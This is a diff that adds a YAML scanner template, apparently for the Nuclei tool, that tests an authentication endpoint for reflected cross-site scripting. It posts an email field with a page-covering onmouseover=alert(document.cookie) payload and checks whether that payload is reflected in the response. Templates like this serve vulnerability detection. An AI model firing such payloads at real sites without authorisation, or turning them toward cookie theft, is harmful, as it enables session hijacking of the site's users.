@@ -1,0 +1,23 @@
+id: kaue-xss-post3
+info:
+  name: Kaue-xss-post3
+  author: kauenavarro
+  severity: medium
+
+requests:
+  - raw:
+      - |
+        POST /en/baseUri?rand= HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+
+        &SubmitCreate=1&ajax=true&back=&controller=authentication&email_create=1%40test.com%20onmouseover=alert(document.cookie) style=\padding:1000px;width:10000px;z-index:9999;margin-top:-1000px;&token=token
+    matchers:
+      - type: word
+        words:
+          - "onmouseover=alert(document.cookie) style=padding:1000px;width:10000px;z-index:9999;margin-top:-1000px;"
